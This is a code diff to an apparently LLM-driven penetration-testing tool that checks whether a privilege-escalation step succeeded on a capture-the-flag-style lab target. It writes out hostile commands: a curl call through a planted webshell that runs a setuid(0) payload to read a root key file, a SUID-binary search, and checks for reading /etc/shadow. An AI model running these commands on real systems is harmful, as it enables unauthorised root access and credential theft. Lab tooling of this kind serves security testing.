+    webshell_url = tactic_evidence.get("execution", {}).get("webshell_url", "")
+    if not root_confirmed and webshell_url:
+        live_ok, live_reason = _verify_root_live(webshell_url)
+        if live_ok:
+            root_confirmed = True
+            evidence["root_live_verified"] = True
+            try:
+                from src.infrastructure.docker_client import DockerClient
+                key_cmd = "python3 -c 'import os; os.setuid(0); os.system(\"cat /root/key-3-of-3.txt\")'"
+                docker = DockerClient()
+                res = docker.exec_in_attacker(
+                    f"curl -s '{webshell_url}?cmd={urllib.parse.quote(key_cmd)}'",
+                    timeout=15,
+                )
+                m = re.search(r"\b([a-f0-9]{32})\b", res.stdout)
+                if m:
+                    evidence["key_3"] = m.group(1)
+            except Exception:
+                pass
 
-    if not root_gained and not key3_read:
-        if not suid_enumerated:
-            missing.append("SUID binaries no enumerados (corre find / -perm -u=s -type f)")
-        else:
-            missing.append(
-                "escalacion no verificada: ejecuta python3 -c \"import os; os.setuid(0); "
-                "os.system('cat /root/key-3-of-3.txt')\" via webshell"
-            )
+    if not root_confirmed:
+        missing.append(
+            "escalacion no verificada: se requiere uid=0(root) en output real, "
+            "lectura de /etc/shadow con hash de root, o verificacion live via webshell"
+        )
 
     if missing:
         return False, "; ".join(missing), evidence
 
-    return (
-        True,
-        f"Root obtenido, key-3={evidence.get('key_3', 'leido')[:16]}...",
-        evidence,
-    )
+    parts = []
+    if evidence.get("uid_0_observed"):
+        parts.append("uid=0 confirmado")
+    if evidence.get("shadow_root_hash"):
+        parts.append("/etc/shadow leido")
+    if evidence.get("root_live_verified"):
+        parts.append("root live verificado")
+    if evidence.get("key_3"):
+        parts.append(f"key-3={evidence['key_3'][:12]}...")
+    return True, "Root confirmado (" + ", ".join(parts) + ")", evidence
 
 
 OBJECTIVE_VALIDATORS: dict[str, Callable[[dict], tuple[bool, str, dict]]] = {
@@ -456,11 +642,10 @@ def check_tactic_objective(state: dict) -> tuple[bool, str, dict]:
     """
     Verifica el objetivo de la tactica actual.
 
-    Returns: (objetivo_cumplido, razon_detallada, evidencia_extraida)
+    Returns: (cumplido, razon, evidencia)
     """
     tactic = state.get("current_tactic", "")
     validator = OBJECTIVE_VALIDATORS.get(tactic)
     if validator is None:
-        # Sin validador: aceptar el juicio del LLM por defecto
         return True, f"No hay validador para {tactic}, aceptando juicio del LLM", {}
     return validator(state)
